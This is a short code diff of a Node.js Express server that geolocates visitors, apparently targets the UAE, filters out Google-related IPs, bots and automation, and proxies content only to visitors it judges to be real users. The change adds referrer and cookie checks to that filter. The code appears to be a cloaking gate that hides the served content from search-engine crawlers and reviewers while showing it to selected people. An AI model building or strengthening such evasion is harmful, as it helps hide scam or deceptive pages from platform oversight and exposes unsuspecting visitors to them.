@@ -14,7 +14,7 @@ const UAE_COUNTRY_CODE = "AE";
 const GEO_API_URL = "http://ip-api.com/json/";
 
 // --- Trust proxy for correct IP detection ---
-app.set("trust proxy", true); // ضروري إذا كنت تستضيف عبر Vercel/Render
+app.set("trust proxy", true);
 
 // --- Bot Keywords ---
 const BOT_KEYWORDS = [
@@ -81,7 +81,7 @@ async function isGoogleRelatedIP(ip) {
   });
 }
 
-// --- Check for real user (not bot, not automation) ---
+// --- Check for real user (not bot, not automation, not fake VPN) ---
 function isLikelyRealUser(req) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const headers = req.headers;
@@ -94,12 +94,17 @@ function isLikelyRealUser(req) {
 
   const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
 
+  const hasReferrer = headers["referer"] || headers["referrer"];
+  const hasCookie = headers["cookie"];
+
   return (
-    ua.includes("mozilla") && // browsers like Chrome, Firefox
+    ua.includes("mozilla") &&
     basicHeadersPresent &&
     !ua.includes("bot") &&
     !ua.includes("google") &&
-    !isSuspicious
+    !isSuspicious &&
+    hasReferrer &&
+    hasCookie
   );
 }
 
@@ -147,7 +152,7 @@ async function proxyContent(targetUrl, req, res) {
 }
 
 // --- Middleware ---
-app.use(requestIp.mw()); // لقراءة IP الزائر الحقيقي
+app.use(requestIp.mw());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
